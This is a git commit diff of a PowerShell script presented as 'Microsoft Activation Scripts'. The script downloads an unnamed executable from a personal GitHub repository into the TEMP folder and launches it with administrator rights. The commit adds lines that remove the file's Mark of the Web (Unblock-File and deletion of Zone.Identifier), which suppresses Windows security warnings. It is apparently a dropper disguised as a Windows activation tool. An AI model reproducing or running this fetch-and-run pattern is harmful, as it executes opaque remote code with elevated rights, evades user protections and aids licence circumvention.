5a9f7c045173885810e395690da37f5b43494f84
acenljd <thebluepoint2@gmail.com>
2025-12-09 01:04:21 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,10 +1,10 @@
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
 $tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
-
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 
+Unblock-File -Path $tempFile -ErrorAction SilentlyContinue
+
+Remove-Item "$tempFile:Zone.Identifier" -Force -ErrorAction SilentlyContinue
+
 Start-Process $tempFile -Verb RunAs -WorkingDirectory "$env:TEMP" -Wait
-
-
-
